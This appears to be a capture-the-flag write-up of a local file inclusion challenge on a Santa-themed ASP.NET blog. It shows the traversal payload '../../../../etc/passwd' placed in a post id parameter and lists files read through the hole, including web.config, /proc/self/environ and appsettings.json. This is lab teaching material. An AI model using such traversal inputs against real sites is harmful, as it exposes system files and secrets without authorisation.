# Challenge

So Santa is quit the avid blogger... But what secrets can this site reveal, other than the crazy life of Santa Claus?

http://santasblog.norwayeast.azurecontainer.io/

Hint: Things are not always what they seem...

# Writeup

Looking around the page seems to give no information. There is a variable on posts ?id=xxx but it does not allow custom input as it fails it seems like.

Dirbuster shows

```
/- 
  Post
  Privacy
  lib
  js
  privacy
  index
  error
  post
```

Running whatweb shows

```bash
$ whatweb -a 3 http://santasblog.norwayeast.azurecontainer.io/
http://santasblog.norwayeast.azurecontainer.io/ [200 OK] Bootstrap, Country [UNITED STATES][US], HTML5, HTTPServer[Kestrel], IP[20.100.208.53], JQuery, PoweredBy[a], Script, Title[Home page - santasblog]
```

I try everything, based on the hint something is not as it seems on this page. But everything is as it seems. All spaces are normal. The text seems too random to be a pattern in. trying to find all capital letters on 1st and then 2nd e.t.c.

Nothing seems to work. I take a few days break.

Back at it, again looking at favicon, hexdumping it, everything is just as it looks! Suddenly I just for laughs try the simple `../../../../etc/passwd` in the post ID field, and sure enough.. Data!? Is it just a simple LFI. I mean I do not really agree on the hint in this case. It hints towards something hidden in plain sight. Oh well, this is pretty much that.. Well. I think the hint could have been better. But I understand that it should be a bit diffused to not give it away.

Oh well, with my new found power I can finally take over the world. I google **dot.net** and **Kestrel** and I see some images of file structures, common they all have web.config. So I brute force it a bit and finally hits ``../web.config``

```xml
<!--?xml version="1.0" encoding="utf-8"?-->
<configuration>
  <location path="." inheritinchildapplications="false">
    <system.webserver>
      <handlers>
        <add name="aspNetCore" path="*" verb="*" modules="AspNetCoreModuleV2" resourcetype="Unspecified">
      </add></handlers>
      <aspnetcore processpath="dotnet" arguments=".\santasblog.dll" stdoutlogenabled="false" stdoutlogfile=".\logs\stdout" hostingmodel="inprocess">
    </aspnetcore></system.webserver>
  </location>
</configuration>
```

After a bit of trial and error I see that I have a few possibilities to figure out the path names. First I guessed that `../../` is the root folder.

```
/app/web.config
/app/santasblog.dll
/proc/self/environ
/proc/self/maps
/app/posts/151222
```

From that DLL file I get more tips for page sources:

```
/Pages/Error.cshtml
/Pages/Index.cshtml
/Pages/Post.cshtml
/Pages/Privacy.cshtml
/Pages/_ViewImports.cshtml
/Pages/_ViewStart.cshtml
/Pages/Shared/_ValidationScriptsPartial.cshtml
/Pages/Shared/_Layout.cshtml
```

I also found this dependency in that dll: `mvc.1.0.razor-page`

I tried to include these files but no luck. Not sure where they are. Annoyed as frick I go to bed. I the next day tell my findings to someone I've collabed with on this, and sure enough he finds another file from a article: `appsettings.json`

So including this we now see the flag. 

```html
<p>{
  "Logging": {
    "LogLevel": {
      "Default": "Information",
      "Microsoft.AspNetCore": "Warning"
    }
  },
  "AllowedHosts": "*",
  "Flag": "${5@N7@<em>5UR3</em>1|V35<em>@</em>CR@ZY_7|F3!!!!}"
}</p>
```

I've already tried to extract the DLL with markdown so I know that `<em>` comes around words surrounded by underscore. So replacing the tags with `_ ` gave me a successful flag extraction!

```
${5@N7@_5UR3_1|V35_@_CR@ZY_7|F3!!!!}
```

Now to get RCE on this one we would need some where we could write data. Unfortunally logging seems to be disabled on the server so I could not include log files with custom written data. 

For me it seems like it reads files and inserts them into a markdown plugin. For RCE I think the parser must allow dot.net code to be run and maybe you can include log file with a custom header or something. But for now I dont think it is possible here (?).
